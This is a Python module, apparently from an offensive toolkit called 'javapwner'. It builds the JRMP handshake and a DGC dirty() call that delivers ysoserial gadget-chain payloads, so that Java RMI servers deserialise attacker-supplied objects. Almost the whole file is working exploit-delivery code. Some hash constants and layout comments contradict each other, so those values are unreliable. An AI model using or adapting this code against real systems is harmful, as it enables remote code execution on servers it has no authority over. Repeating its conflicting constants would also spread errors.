"""JRMP (Java Remote Method Protocol) handshake and DGC dirty-call builder.

Wire format reference: JDK source sun.rmi.transport.tcp / sun.rmi.transport.StreamRemoteCall

JRMP Handshake
--------------
CLIENT → SERVER:
  4A 52 4D 49   "JRMI" magic
  00 02         protocol version
  4B            StreamProtocol type-byte

SERVER → CLIENT (if JRMP listener):
  4E            ProtocolAck
  00 XX         server version (uint16)
  [writeUTF]    server hostname
  00 00 XX XX   server port (uint32)

DGC Dirty Call
--------------
Used to trigger deserialisation of an arbitrary payload via the Distributed
Garbage Collector endpoint which is always present on JRMP services.

The minimal wire encoding to invoke DGC.dirty() is:
  [MessageType: 0x50 = Call]
  [ObjID: fixed DGC OID  → 4 bytes obj-num + 4 bytes space + 8 bytes addr]
  [Operation: dirty = method hash 0xDF_11_01_5C_B2_C5_6B_69L]
  [Hash: interface hash   0xF6_B6_89_8D_8B_F2_8C_FEL]
  [payload as ObjectOutputStream]

For our purposes we use the well-known encoding that ysoserial itself uses
(derived from the original exploit by @frohoff and @gebl).
"""

from __future__ import annotations

import struct
from typing import Any

from javapwner.core.socket_helper import read_java_utf
from javapwner.exceptions import JrmpError

# JRMP constants
JRMP_MAGIC = b"\x4a\x52\x4d\x49"  # "JRMI"
JRMP_VERSION = b"\x00\x02"
STREAM_PROTOCOL = b"\x4b"          # StreamProtocol
PROTOCOL_ACK = 0x4E

# Message types
MSG_CALL = 0x50
MSG_PING = 0x52
MSG_PING_ACK = 0x53
MSG_DGC_ACK = 0x54

# DGC Object IDs (fixed by the RMI spec)
# ObjID wire format per JDK ObjID.write() + UID.write():
#   objNum     : long  (int64, 8 bytes) — DGC = 2
#   uid.unique : int   (int32, 4 bytes) — 0  ← writeInt(), NOT writeShort()
#   uid.time   : long  (int64, 8 bytes) — 0
#   uid.count  : short (int16, 2 bytes) — 0
_DGC_OBJ_ID = (
    struct.pack(">q", 2)   # objNum: long (8 bytes)
    + struct.pack(">i", 0)  # uid.unique: int (4 bytes)
    + struct.pack(">q", 0)  # uid.time: long (8 bytes)
    + struct.pack(">h", 0)  # uid.count: short (2 bytes)
)  # 22 bytes total

# DGC.dirty() method hash (from JDK internals, for new-style hash dispatch)
_DIRTY_METHOD_HASH = struct.pack(">q", -0x20EEFEA34D8A9697)  # 0xDF11015CB2C56B69 signed

# DGC interface hash used in old-style op-index dispatch (op=1 → dirty)
# Source: sun/rmi/transport/DGCImpl_Skel.class — interfaceHash field
# = 0xF6B6898D8BF28643 unsigned = -669196253586618813 signed
_DGC_INTERFACE_HASH = struct.pack(">q", -669196253586618813)

# Serial sequence number (call id)
_CALL_ID = struct.pack(">q", 0)


# ---------------------------------------------------------------------------
# Handshake builders / parsers
# ---------------------------------------------------------------------------

def build_jrmp_handshake() -> bytes:
    """Return the 7-byte JRMP client handshake."""
    return JRMP_MAGIC + JRMP_VERSION + STREAM_PROTOCOL


def build_client_endpoint() -> bytes:
    """Return the 6-byte client endpoint (step 3 of JRMP StreamProtocol handshake).

    After receiving ProtocolAck the client must send its own endpoint:
      writeUTF("")   → 2-byte length prefix (0x00 0x00) + 0 bytes of string
      writeInt(0)    → 4-byte big-endian zero

    Without this step the server's readUTF() consumes CALL bytes as a string
    length, corrupting all subsequent communication.
    """
    return b"\x00\x00" + b"\x00\x00\x00\x00"


def parse_jrmp_ack(data: bytes) -> dict[str, Any]:
    """Parse the JRMP server ProtocolAck response.

    Returns a dict with keys: ``ack_byte``, ``version``, ``hostname``, ``port``.
    Raises :class:`~javapwner.exceptions.JrmpError` if the ack byte is missing
    or the response is too short to parse.
    """
    if not data:
        raise JrmpError("Empty JRMP response")

    ack = data[0]
    if ack != PROTOCOL_ACK:
        raise JrmpError(
            f"Expected ProtocolAck (0x{PROTOCOL_ACK:02x}), got 0x{ack:02x}"
        )

    result: dict[str, Any] = {
        "ack_byte": ack,
        "version": None,
        "hostname": None,
        "port": None,
    }

    if len(data) < 3:
        return result

    result["version"] = struct.unpack_from(">H", data, 1)[0]

    if len(data) >= 5:
        try:
            hostname, offset = read_java_utf(data, 3)
            result["hostname"] = hostname
            if offset + 4 <= len(data):
                result["port"] = struct.unpack_from(">I", data, offset)[0]
        except (struct.error, IndexError):
            pass

    return result


# ---------------------------------------------------------------------------
# DGC Dirty call builder
# ---------------------------------------------------------------------------

_OOS_HEADER = b"\xac\xed\x00\x05"  # JAVA_STREAM_MAGIC + JAVA_STREAM_VERSION


def build_dgc_dirty_call(payload_bytes: bytes) -> bytes:
    """Encapsulate *payload_bytes* in a JRMP DGC dirty() call message.

    Correct wire format (proven by real JDK wire capture):
      MSG_CALL (0x50)
      AC ED 00 05         ObjectOutputStream header (before ObjID!)
      77 22               TC_BLOCKDATA, 34 bytes
      [DGC ObjID 22B]     inside block data
      [op=1, 4 bytes]     inside block data  (dirty() = op 1)
      [hash, 8 bytes]     inside block data  (DGC interface hash)
      [object bytes]      gadget chain content without OOS header

    *payload_bytes* must be a complete OOS stream (starts with AC ED 00 05).
    The OOS header is stripped and the raw object content is embedded as the
    argument that DGC.dirty() will deserialise.
    """
    block_data = _DGC_OBJ_ID + struct.pack(">i", 1) + _DGC_INTERFACE_HASH  # 34 bytes

    # Strip the OOS header (AC ED 00 05) from the ysoserial payload.
    # What remains is the raw TC_OBJECT / TC_ARRAY content that the server's
    # MarshalInputStream.readObject() will deserialise as the first argument.
    if payload_bytes[:2] == b"\xac\xed":
        object_bytes = payload_bytes[4:]
    else:
        object_bytes = payload_bytes

    return (
        bytes([MSG_CALL])
        + _OOS_HEADER                        # OOS header (comes first)
        + bytes([0x77, len(block_data)])     # TC_BLOCKDATA, length=34
        + block_data
        + object_bytes
    )
